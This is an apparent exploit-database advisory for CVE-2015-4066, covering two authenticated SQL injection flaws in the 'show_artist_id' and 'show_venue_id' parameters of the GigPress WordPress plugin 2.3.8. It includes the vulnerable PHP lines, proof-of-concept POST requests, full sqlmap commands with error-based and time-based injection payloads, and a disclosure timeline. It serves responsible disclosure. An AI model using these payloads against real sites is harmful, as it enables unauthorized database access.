@@ -1,0 +1,102 @@
+# Title: SQLi vulnerabilities in WordPress plugin "GigPress"
+# Author: Adrián M. F. - adrimf85[at]gmail[dot]com
+# Date: 2015-05-25
+# Vendor Homepage: https://wordpress.org/plugins/gigpress/
+# Active installs: 20,000+
+# Vulnerable version: 2.3.8
+# Fixed version: 2.3.9
+# CVE: CVE-2015-4066
+
+ Vulnerabilities (2)
+=====================
+
+(1) Authenticated SQLi [CWE-89]
+-------------------------------
+
+* CODE:
+admin/handlers.php:87
++++++++++++++++++++++++++++++++++++++++++
+$show['show_tour_id'] = $_POST['show_tour_id'];
++++++++++++++++++++++++++++++++++++++++++
+admin/handlers.php:94
++++++++++++++++++++++++++++++++++++++++++
+$artist = $wpdb->get_var("SELECT artist_name FROM " . GIGPRESS_ARTISTS . " WHERE artist_id = " . $show['show_artist_id'] . "");
++++++++++++++++++++++++++++++++++++++++++
+
+
+* POC:
+http://[domain]/wp-admin/admin.php?page=gigpress/gigpress.php
+POST DATA:
+_wpnonce=b31c921d92&_wp_http_referer=/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php&gpaction=add&show_status=active&gp_mm=05&gp_dd=05&gp_yy=2015&show_artist_id=1[SQLi]&show_venue_id=1&show_related=new
+
+SQLMap
++++++++++++++++++++++++++++++++++++++++++
+./sqlmap.py --cookie="[cookie]" --dbms mysql -u "http://[domain]/wp-admin/admin.php?page=gigpress/gigpress.php" --data="_wpnonce=b31c921d92&_wp_http_referer=/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php&gpaction=add&show_status=active&gp_mm=05&gp_dd=05&gp_yy=2015&show_artist_id=1&show_venue_id=1&show_related=new" -p show_artist_id --dbms mysql
+[............]
+POST parameter 'show_artist_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection points with a total of 72 HTTP(s) requests:
+---
+Parameter: show_artist_id (POST)
+   Type: error-based
+   Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+   Payload: _wpnonce=b31c921d92&_wp_http_referer=/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php&gpaction=add&show_status=active&gp_mm=05&gp_dd=05&gp_yy=2015&show_artist_id=1 AND (SELECT 9266 FROM(SELECT COUNT(*),CONCAT(0x717a6a7a71,(SELECT (ELT(9266=9266,1))),0x71786a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&show_venue_id=1&show_related=new
+
+   Type: AND/OR time-based blind
+   Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+   Payload: _wpnonce=b31c921d92&_wp_http_referer=/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php&gpaction=add&show_status=active&gp_mm=05&gp_dd=05&gp_yy=2015&show_artist_id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))BiUm)&show_venue_id=1&show_related=new
+---
+[12:21:09] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 7.0 (wheezy)
+web application technology: Apache 2.2.22, PHP 5.4.39
+back-end DBMS: MySQL 5.0
++++++++++++++++++++++++++++++++++++++++++
+
+
+(2) Authenticated SQLi [CWE-89]
+-------------------------------
+
+* CODE:
+admin/handlers.php:71
++++++++++++++++++++++++++++++++++++++++++
+$show['show_venue_id'] = $_POST['show_venue_id'];
++++++++++++++++++++++++++++++++++++++++++
+admin/handlers.php:95
++++++++++++++++++++++++++++++++++++++++++
+$venue = $wpdb->get_results("SELECT venue_name, venue_city FROM " . GIGPRESS_VENUES . " WHERE venue_id = " . $show['show_venue_id'] . "", ARRAY_A);
++++++++++++++++++++++++++++++++++++++++++
+
+
+* POC:
+http://[domain]/wp-admin/admin.php?page=gigpress/gigpress.php
+POST DATA:
+_wpnonce=b31c921d92&_wp_http_referer=/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php&gpaction=add&show_status=active&gp_mm=05&gp_dd=05&gp_yy=2015&show_artist_id=1&show_venue_id=1[SQLi]&show_related=new
+
+SQLMap
++++++++++++++++++++++++++++++++++++++++++
+./sqlmap.py --cookie="[cookie]" --dbms mysql -u "http://[domain]/wp-admin/admin.php?page=gigpress/gigpress.php" --data="_wpnonce=b31c921d92&_wp_http_referer=/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php&gpaction=add&show_status=active&gp_mm=05&gp_dd=05&gp_yy=2015&show_artist_id=1&show_venue_id=1&show_related=new" -p show_venue_id --dbms mysql
+[............]
+POST parameter 'show_venue_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection points with a total of 72 HTTP(s) requests:
+---
+Parameter: show_venue_id (POST)
+   Type: error-based
+   Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+   Payload: _wpnonce=b31c921d92&_wp_http_referer=/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php&gpaction=add&show_status=active&gp_mm=05&gp_dd=05&gp_yy=2015&show_artist_id=1&show_venue_id=1 AND (SELECT 6543 FROM(SELECT COUNT(*),CONCAT(0x717a6a7a71,(SELECT (ELT(6543=6543,1))),0x71786a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&show_related=new
+
+   Type: AND/OR time-based blind
+   Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+   Payload: _wpnonce=b31c921d92&_wp_http_referer=/wordpress/wp-admin/admin.php?page=gigpress/gigpress.php&gpaction=add&show_status=active&gp_mm=05&gp_dd=05&gp_yy=2015&show_artist_id=1&show_venue_id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))OzkE)&show_related=new
+---
+[12:23:57] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 7.0 (wheezy)
+web application technology: Apache 2.2.22, PHP 5.4.39
+back-end DBMS: MySQL 5.0
++++++++++++++++++++++++++++++++++++++++++
+
+
+Timeline
+========
+2015-05-09: Discovered vulnerability.
+2015-05-20: Vendor notification.
+2015-05-20: Vendor response and fix.
+2015-05-25: Public disclosure.
